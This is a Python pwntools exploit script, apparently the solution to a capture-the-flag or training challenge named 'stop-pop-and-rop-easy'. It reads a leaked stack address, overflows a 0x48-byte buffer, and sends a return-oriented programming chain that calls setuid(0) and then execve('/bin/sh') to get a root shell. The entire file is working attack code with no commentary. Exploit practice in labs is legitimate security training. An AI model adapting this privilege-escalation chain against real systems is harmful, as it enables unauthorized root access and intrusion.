from pwn import * 


GOAL=b'/bin/sh\x00'
BUFFER_LEN=0x48


def get_payload(args, proc: process):
    payload = GOAL
    payload += cyclic(BUFFER_LEN - len(GOAL))

    proc.recvuntil(b"[LEAK] Your input buffer is located at: 0x")
    leak_stack_addr = proc.recvline(drop=True)[:-1]
    print(f"Leaked addr: {leak_stack_addr}")

    # setuid to root syscall
    payload += p64(0x401b8c)
    payload += p64(0x69)
    payload += p64(0x401ba4)
    payload += p64(0)
    payload += p64(0x401b84)

    # execve /bin/sh
    payload += p64(0x401b8c)
    payload += p64(0x3B)
    payload += p64(0x401ba4)
    payload += p64(int(leak_stack_addr, 16))
    payload += p64(0x401bad)
    payload += p64(0)
    payload += p64(0x401b9c)
    payload += p64(0)
    payload += p64(0x401b84)

    return payload


def main():
    proc = process("/challenge/stop-pop-and-rop-easy")
    proc.send(get_payload(None, proc))


if __name__ == '__main__':
    main()
